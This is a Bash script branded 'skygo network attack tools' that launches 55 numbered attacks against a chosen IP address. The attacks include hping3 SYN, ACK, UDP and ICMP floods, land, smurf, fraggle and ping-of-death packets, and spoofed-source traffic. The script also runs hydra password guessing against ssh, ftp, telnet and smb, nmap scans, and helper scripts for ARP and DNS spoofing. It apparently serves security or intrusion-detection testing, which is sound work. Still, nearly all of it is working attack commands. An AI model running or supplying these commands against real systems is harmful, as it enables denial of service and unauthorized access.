#!/bin/bash
# 全局参数
VERSION="1.0.1"
USERNAME="root"
IP=192.168.31.55
IP_segment=192.168.31.0
type=100

function logo() {
    echo "#######################################################"
    echo "#                                                     #"
	echo "#       _____  _   ____   __  _____  _____  	      #"
	echo "#      /  ___|| | / /\ \ / / |  __ \|  _  |           #"
	echo "#      \ '--. | |/ /  \ V /  | |  \/| | | |           #"
	echo "#       '--. \|    \   \ /   | | __ | | | |           #"
	echo "#      /\__/ /| |\  \  | |   | |_\ \\ \_/ /            #"
	echo "#      \____/ \_| \_/  \_/    \____/ \___/            #"	                                  
    echo "#                                                     #"
    echo "#    Welecom to use the skygo network attack tools    #"
    echo "#                                                     #"
    echo "#######################################################"
	echo "VERSION:$VERSION"
}

function do_DF_attck() {
    case $type in
		1)
			# 名称：TCP SYN 扫描
			# 解释：默认TCP  -8 扫描模式  all 全部端口  -S syn包  $IP 攻击的ip地址
			echo 'TCP_SYN_SCAN'
			hping3 -8 all -S $IP
			;;
		2)
			echo 'TCP_NULL_SCAN'
			hping3 -8 all  $IP
			;;
		3)
			echo 'TCP_FIN_SCAN'
			hping3 -8 all -F $IP
			;;
		4)
			echo 'TCP_ACK_SCAN'
			hping3 --flood -8 all -A $IP
			;;
		5)
			echo 'TCP_XMAS_SCAN'
			hping3 --flood -P -U -F -p ++ $IP
			;;
		6)
			echo 'TCP_CONNECT_SCAN'
			hping3 -8 5000-5020 -S $IP
			;; 
		7)
			echo 'TCP_SRC_PORT_ZERO'
			hping3 --faster -s 0 -p 5000 $IP
			;;
		8)
			echo 'TCP_FIN_RST_DOS'
			hping3 --flood -F -R -p 5000 $IP
			;;
		9)
			echo 'TCP_ACK_FIN_DOS'
			hping3 --flood -F -A -p 5000 $IP
			;;
		10)
			echo 'TCP_SYN_ACK_FLOOD'
			hping3 --flood -S -A -p 5000 $IP
			;;
		11)
			echo 'TCP_ACK_RST_DOS'
			hping3 --flood -R -A -p 5000 $IP
			;;
		12)
			echo 'TCP_ACK_PSH_FLOOD'
			hping3 --flood -P -A -p 5000 $IP
			;;
		13)
			echo 'TCP_SYN_FLOOD'
			hping3 --flood -S -p 5000 $IP
			;;
		14)
			#和TCP_FIN_SYN_STACK_ABNORMAL必为伴生攻击
			echo 'TCP_FIN_SYN_DOS'
			hping3 --flood -F -S -p 5000 $IP
			;; 
		15)
			echo 'TCP_FIN_SYN_STACK_ABNORMAL'
			hping3 -S -F $IP
			;; 
		16)
			echo 'TCP_LAND_ATTACK'
			hping3 --flood -S -a $IP $IP
			;;
		17)
			echo 'UDP_SRC_PORT_ZERO'
			hping3 -2 -s 0 $IP 
			;;
		18)
			echo 'FRAGGLE_ATTACK'
			hping3 --flood -2 $IP -s 1-1024 -p 7
			;;
		19)
			echo 'UDP_PORT_FLOOD'
			hping3 --flood -2 $IP -s 1-1024 -p 5000
			;;
		20)
			echo 'UDP_PORT_SCAN'
			hping3 --flood -2 -p ++  $IP
			;; 
		21)
			echo 'ICMP_LARGE_PING'
			hping3 --flood --icmp -d 1800 $IP
			;;
		22)
			echo 'ICMP_DEATH_PING'
			hping3 --icmp -d 65495 $IP
			;;
		23)
			echo 'ICMP_TERMINAL_EXIST_DETECT'
			hping3 --flood --icmp -d 100 $IP
			;;
		24)
			echo 'ICMP_SMURF_ATTACK'
			hping3 --icmp -a $IP $IP
			;;
		25)
			echo 'ICMP_ECHO_FLOODING'
			hping3 --flood --icmp $IP
			;;
		26)
			echo 'ICMP_FORGE_SRC_ATTACK'
			hping3 -i u20000 --icmp --rand-source $IP
			;;
		27)
			echo 'TCP_BLAT'
			hping3 -s 5000 -p 5000 -c 1 $IP
			hping3 -s 5000 -p 5000 -c 1 $IP
			hping3 -s 5000 -p 5000 -c 1 $IP
			;;
		28)
			echo 'UDP_BLAT'
			hping3 -2 -s 5000 -p 5000 -c 1 $IP
			hping3 -2 -s 5000 -p 5000 -c 1 $IP
			hping3 -2 -s 5000 -p 5000 -c 1 $IP
			;;
		29)
			echo 'TCP_SYNError'
			hping3 -S -s 1  -c 1023 $IP
			;;
		30)
			echo 'TCP_ShortHDR'
			sudo python3 tcp_length.py -i $IP -p 9876
			;;
        31)
            echo 'UDP_ShortHDR'
            sudo python3 udp_length.py -i $IP -p 9876
            ;; 
		32)
			echo 'TCP_FragError'
			hping3 -g 100 $IP
			;;
        33)
            echo 'HTTP_SQL_EXCEPTION'
            sudo python3 http_cve.py -i $IP
            ;; 
        34)
            echo 'TLS_HEARBEAT_EXCEPTION'
            sudo python3 tls_Heartbeat.py
            ;; 
        35)
            echo 'DNS_SPOOF_EXCEPTION'
            sudo python3 dns_spoof.py
            ;; 
        36)
            echo 'ARP_SPOOF'
            sudo python3 arp_spoof.py
            ;; 
		37)
			echo 'ssh password burst'
			hydra -l usrT1 -p 12345671 -t 2  -vV $IP ssh
			hydra -l rootT2 -p 12345672 -t 2  -vV $IP ssh
			hydra -l usrT3 -p 12345673 -t 2  -vV $IP ssh
			hydra -l rootT4 -p 12345674 -t 2  -vV $IP ssh
			hydra -l usrT5 -p 12345675 -t 2  -vV $IP ssh
			hydra -l rootT6 -p 12345676 -t 2  -vV $IP ssh
			hydra -l usrT7 -p 12345677 -t 2  -vV $IP ssh
			hydra -l rootT8 -p 12345678 -t 2  -vV $IP ssh
			hydra -l usrT9 -p 12345679 -t 2  -vV $IP ssh
			hydra -l rootT10 -p 12345670 -t 2  -vV $IP ssh
			;; 
		38)
			echo 'ftp password burst'
			hydra -l usrT1 -p 12345671 -t 2  -vV  ftp://$IP
			hydra -l rootT2 -p 12345672 -t 2  -vV ftp://$IP
			hydra -l usrT3 -p 12345673 -t 2  -vV ftp://$IP
			hydra -l rootT4 -p 12345674 -t 2  -vV ftp://$IP
			hydra -l usrT5 -p 12345675 -t 2  -vV ftp://$IP
			hydra -l rootT6 -p 12345676 -t 2  -vV ftp://$IP
			hydra -l usrT7 -p 12345677 -t 2  -vV ftp://$IP
			hydra -l rootT8 -p 12345678 -t 2  -vV ftp://$IP
			hydra -l usrT9 -p 12345679 -t 2  -vV ftp://$IP
			hydra -l rootT10 -p 12345670 -t 2  -vV ftp://$IP
			;; 
		39)
			echo 'telnet password burst'
			hydra -l usrT1 -p 12345671 -t 2  -vV $IP telnet
			hydra -l rootT2 -p 12345672 -t 2  -vV $IP telnet
			hydra -l usrT3 -p 12345673 -t 2  -vV $IP telnet
			hydra -l rootT4 -p 12345674 -t 2  -vV $IP telnet
			hydra -l usrT5 -p 12345675 -t 2  -vV $IP telnet
			hydra -l rootT6 -p 12345676 -t 2  -vV $IP telnet
			hydra -l usrT7 -p 12345677 -t 2  -vV $IP telnet
			hydra -l rootT8 -p 12345678 -t 2  -vV $IP telnet
			hydra -l usrT9 -p 12345679 -t 2  -vV $IP telnet
			hydra -l rootT10 -p 12345670 -t 2  -vV $IP telnet
			;; 
		40)
			echo 'smb password burst'
			hydra -l usrT1 -p 12345671 -t 2  -vV $IP smb
			hydra -l rootT2 -p 12345672 -t 2  -vV $IP smb
			hydra -l usrT3 -p 12345673 -t 2  -vV $IP smb
			hydra -l rootT4 -p 12345674 -t 2  -vV $IP smb
			hydra -l usrT5 -p 12345675 -t 2  -vV $IP smb
			hydra -l rootT6 -p 12345676 -t 2  -vV $IP smb
			hydra -l usrT7 -p 12345677 -t 2  -vV $IP smb
			hydra -l rootT8 -p 12345678 -t 2  -vV $IP smb
			hydra -l usrT9 -p 12345679 -t 2  -vV $IP smb
			hydra -l rootT10 -p 12345670 -t 2  -vV $IP smb
			;; 
		41)
			echo 'ssh login'
			ssh $USERNAME@$IP
			;;
        42)
            echo 'Doip Reset Test'
            sudo python3 Doip_Reset_Test.py
            ;; 
        43)
            echo 'MQTT connect'
            mosquitto_pub -h $IP -p 1883 -u daniel -P 123456 -t "test" -m "hello"
            ;; 
        44)
            echo 'SOMEIP SD Data_Test'
            sudo python3 SOMEIP_SD_Data_Test.py
            ;;
        45)
            echo 'ICMP_FORGE_SRC_ATTACK_DYNAMIC'
            sudo python3 icmp_forged_source_icmp.py
            ;;
		46)
		    echo 'DoIP_server'
            sudo python3 DoIP_server.py
            ;;
		47)
		    echo 'DoIP_client'
            sudo python3 DoIP_client.py
            ;;
		48)
		    echo 'SOMEIP_server'
            sudo python3 SOMEIP_server.py
            ;;
		49)
		    echo 'SOMEIP_client'
            sudo python3 SOMEIP_client.py
            ;;
		50)
		    echo 'HTTPS_server'
            sudo python3 https_server.py
            ;;
		51)
		    echo 'HTTPS_client'
            sudo python3 https_client.py
            ;;
		52)
		    echo 'TCP_server'
            sudo python3 TCP_server.py
            ;;
		53)
		    echo 'TCP_client'
            sudo python3 TCP_client.py
            ;;
		54)
			echo 'SERVER_VER_SCAN'
			nmap $IP -sV -O
			;;
		55)
			echo 'ICMP_TERMINAL_SURVIVAL_SCAN'
			 nmap -sP $IP_segment/24
			;;
        -v|--version)
            echo "$VERSION"
            exit 0
            ;;
		*)
            usage
            ;;
    esac
}

# 用法解释说明
# sudo ./hping3      			使用说明
# sudo ./hping3 1    			对默认Ip 192.168.225.1进行TCP_SYN_SCAN攻击
# sudo ./hping3 1 192.168.10.1  对指定Ip 192.168.10.1进行TCP_SYN_SCAN攻击
function usage() {
	logo
    echo "Usage: $0 num [IP]"
    echo "Describe: num:Attack type. IP:Attack address,the default value is 192.168.225.1"
    echo "eg: $0 1 192.168.1.100, Attack type is TCP_SYN_SCAN, attack address is 192.168.1.100"
    echo "eg: $0 2, Attack type is TCP_NULL_SCAN, attack address is 192.168.225.1"
	echo "-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-"
	echo "num | type"

    echo '1  TCP_SYN_SCAN'
	echo '2  TCP_NULL_SCAN'
	echo '3  TCP_FIN_SCAN'
	echo '4  TCP_ACK_SCAN'
	echo '5  TCP_XMAS_SCAN'
	echo '6  TCP_CONNECT_SCAN'
	echo '7  TCP_SRC_PORT_ZERO'
	echo '8  TCP_FIN_RST_DOS'
	echo '9  TCP_ACK_FIN_DOS'
	echo '10 TCP_SYN_ACK_FLOOD'
	echo '11 TCP_ACK_RST_DOS'
	echo '12 TCP_ACK_PSH_FLOOD'
	echo '13 TCP_SYN_FLOOD'
	echo '14 TCP_FIN_SYN_DOS'
	echo '15 TCP_FIN_SYN_STACK_ABNORMAL'
	echo '16 TCP_LAND_ATTACK'
	echo '17 UDP_SRC_PORT_ZERO'
	echo '18 FRAGGLE_ATTACK'
    echo '19 UDP_PORT_FLOOD'
	echo '20 UDP_PORT_SCAN'
    echo '21 ICMP_LARGE_PING'
    echo '22 ICMP_DEATH_PING'
    echo '23 ICMP_TERMINAL_EXIST_DETECT'
    echo '24 ICMP_SMURF_ATTACK'
	echo '25 ICMP_ECHO_FLOODING'
    echo '26 ICMP_FORGE_SRC_ATTACK' 
	echo '27 TCP_BLAT'
	echo '28 UDP_BLAT'
	echo '29 TCP_SYNError'	
	echo '30 TCP_ShortHDR'
	echo '31 UDP_ShortHDR'
	echo '32 TCP_FragError'
	echo '33 HTTP_SQL_EXCEPTION'
	echo '34 TLS_HEARBEAT_EXCEPTION'
	echo '35 DNS_SPOOF_EXCEPTION'
	echo '36 ARP_SPOOF'
	echo '37 ssh password burst'
	echo '38 ftp password burst'
	echo '39 telnet password burst'
	echo '40 smb password burst'
	echo '41 ssh login'
   	echo '42 Doip Reset Test' 
   	echo '43 MQTT connect' 
   	echo '44 SOMEIP SD Data_Test'
   	echo '45 ICMP_FORGE_SRC_ATTACK_DYNAMIC'
   	echo '46 DoIP_server'
	echo '47 DoIP_client'
   	echo '48 SOMEIP_server'
	echo '49 SOMEIP_client'
	echo '50 HTTPS_server'
	echo '51 HTTPS_client'
	echo '52 TCP_server'
	echo '53 TCP_client'
	echo '54 SERVER_VER_SCAN'
	echo '55 ICMP_TERMINAL_SURVIVAL_SCAN'
}


# 获取网络时间
function get_netime() {
	ntp_server="pool.ntp.org"  # NTP服务器地址

	# 使用ntpdate命令获取联网时间
	ntpdate_result=$(ntpdate -q $ntp_server 2>&1)

	if [ $? -eq 0 ]; then
		# 提取时间信息
		date_string=$(echo "$ntpdate_result" | grep "server" | awk '{print $2, $3}')
		echo "联网时间: $date_string"
	else
		echo "无法获取联网时间: $ntpdate_result"
	fi
}

#检测是否过期
function get_nowtime() {
	expiration_date="2024-9-30"    # 过期日期，以YYYY-MM-DD的格式表示
	current_date=$(date +%F)       # 当前日期，以YYYY-MM-DD的格式表示

	expiration_timestamp=$(date -d "$expiration_date" +%s)
	current_timestamp=$(date -d "$current_date" +%s)
	if [ $current_timestamp -gt $expiration_timestamp ]; then
		echo "The tool has expired!"
		isexpire=0
	else
		isexpire=1
	fi
}

# main
if [ $# = 0 ]; then
	usage
else
	# 时间检测
	#get_netime
	get_nowtime
	if [[ $isexpire == 0 ]]; then
		exit
	fi

	# 攻击
	type=$1
	if [ $# = 2 ];then
		IP=$2
	fi
	do_DF_attck
fi

